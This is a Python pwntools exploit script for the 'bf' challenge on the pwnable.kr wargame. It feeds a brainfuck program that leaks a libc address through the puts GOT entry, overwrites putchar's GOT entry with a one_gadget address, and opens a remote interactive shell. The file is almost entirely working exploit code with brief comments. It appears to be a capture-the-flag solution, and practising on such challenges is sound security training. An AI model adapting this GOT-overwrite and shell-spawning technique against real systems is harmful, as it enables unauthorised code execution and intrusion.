#!/usr/bin/env python3

from pwn import *
from time import sleep
exe = ELF("./bf")
libc = ELF("./bf_libc.so")
ld = ELF("./ld-2.23.so")

context.binary = exe
context.terminal = ("tmux", "splitw", "-h")

def conn():
    if args.LOCAL:
        r = process([ld.path, exe.path], env={"LD_PRELOAD":libc.path})
        if args.GDB:
            gdb.attach(r, gdbscript="add-symbol-file ./bf\nset follow-fork-mode child")
    else:
        r = remote("pwnable.kr", 9001)

    return r


def main():
    r = conn()

    putchar = 0x804a030
    p = 0x804a080
    tape = 0x804a0a0
    ONE_GADGET = 0x5fbd5

    payload = b""
    # first we'll overwrite putchar with one gadget 
    # NOTE: the one_gadget i picked has a constraint of EAX == NULL.
    # therefore we'll make sure that when we call putchar we call it on a null
    payload += b"<" * (tape - p) # move p to its own LSB
    payload += b',' # write into it the LSB of puts (i used puts to leak cus for some reason putchar wasnt leaking properly)
    payload += b'.>.>.>.<<<'  # leak puts
    payload += b'>' * (0x30 - 0x18) # move P to putchar
    payload += b',>,>,>,>>>>>>>' # overwrite putchar and bring memptr back to bss so we can write with no danger

    payload += b"," # write null byte

    payload += b'.' # basically calls system on the current memory pointer

    r.recvuntil(b"type some brainfuck instructions except [ ]\n")
    r.sendline(payload)
    r.send(b'\x18') # puts .got.plt lsb

    sleep(1) # wait a second cus server slow

    leak = u32(r.recv(4))
    info("Leaked puts: " + hex(leak))
    libc.address  =  leak - libc.sym.puts 
    info("Libc addr: " + hex(libc.address))
    info("system@GLIBC: " + hex(libc.sym.system))
    # input("b *0x08048648\nc") - i used this for debug
    r.send(p32(libc.address + ONE_GADGET)) # overwrite putchar with one_gadget
    r.send(b"\x00") # ensure eax = null in one_gadget

    # enjoy shell!!!
    r.interactive()



if __name__ == "__main__":
    main()
